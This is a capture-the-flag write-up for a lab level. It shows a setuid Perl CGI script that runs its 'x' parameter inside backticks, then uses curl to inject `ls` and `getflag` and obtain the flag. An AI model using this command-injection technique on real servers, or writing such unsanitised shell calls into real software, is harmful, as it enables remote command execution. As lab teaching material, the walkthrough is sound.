▐▓▌   ▐▓▓▓▓▌▐▓▌▐▓▌▐▓▓▓▓▌▐▓▌   ▐▓▓▓▓▌▐▓▌▐▓▌
▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌▐▓▌
▐▓▌   ▐▓▓▓▌ ▐▓▌▐▓▌▐▓▓▓▌ ▐▓▌   ▐▓▌▐▓▌▐▓▓▓▓▌
▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌   ▐▓▌
▐▓▓▓▓▌▐▓▓▓▓▌ ▐▓▓▌ ▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▓▌   ▐▓▌

=======
file level04.pl
level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable

cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));

x(param("x")) calls the subroutine with the content of param "x"
https://google.com/?param=bonjour
param("param)=bonjour

The following line is the exploit :  print `echo $y 2>&1`;
It allows us to execute a command during interpretation.

First let's try the script:
curl -I http://localhost:4747
HTTP/1.1 200 OK
Date: Tue, 13 Oct 2026 12:20:17 GMT
Server: Apache/2.2.22 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1
Content-Type: text/html

Ok it works and now can we add params ?
curl -v http://localhost:4747/?x=`ls`
* About to connect() to localhost port 4747 (#0)
*   Trying 127.0.0.1... connected
> GET /?x=level04.pl HTTP/1.1
> User-Agent: curl/7.22.0 (i686-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3
> Host: localhost:4747
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Tue, 13 Oct 2026 12:21:57 GMT
< Server: Apache/2.2.22 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 11
< Content-Type: text/html
< 
level04.pl
* Connection #0 to host localhost left intact
* Closing connection #0


Ok it works so now we know that we can inject the getflag inside this and it will get executed

curl -v 'http://localhost:4747/?x=`getflag`'
and we get the flag!
